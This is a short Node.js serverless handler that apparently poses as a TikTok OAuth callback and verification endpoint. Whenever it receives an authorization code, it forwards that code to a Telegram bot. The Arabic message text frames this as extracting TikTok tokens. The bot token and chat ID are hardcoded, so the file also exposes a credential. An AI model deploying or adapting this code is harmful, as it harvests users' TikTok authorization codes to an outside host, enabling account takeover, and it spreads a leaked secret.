const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
const TELEGRAM_CHAT_ID = '7644255708';

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  
  const url = req.url || '';

  if (url.includes('tiktok-developers-site-verification')) {
    res.setHeader('Content-Type', 'text/plain');
    return res.end('Tiktok-developers-site-verification=X0rbCBz0sv0XGnslTmw9ZyRWVDIdmha5');
  }

  if (url.includes('/api/callback') || url.includes('/api/auth')) {
    const urlParts = url.split('?');
    const queryString = urlParts.length > 1 ? urlParts[1] : '';
    const params = new URLSearchParams(queryString);
    const code = params.get('code');

    // إذا وُجد كود، نجبر السيرفر على انتظاره حتى يرسل للتليجرام بنجاح
    if (code) {
      const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
      
      try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: messageText
          })
        });
      } catch (err) {
        console.error('Telegram Error:', err);
      }
    }

    res.setHeader('Content-Type', 'application/json');
    return res.end(JSON.stringify({
      status: "success",
      message: "AWR Engine: Interface Ready",
      received_code: code || "No code provided yet"
    }));
  }

  res.setHeader('Content-Type', 'text/plain');
  res.end('AWR Central Engine Ready');
};
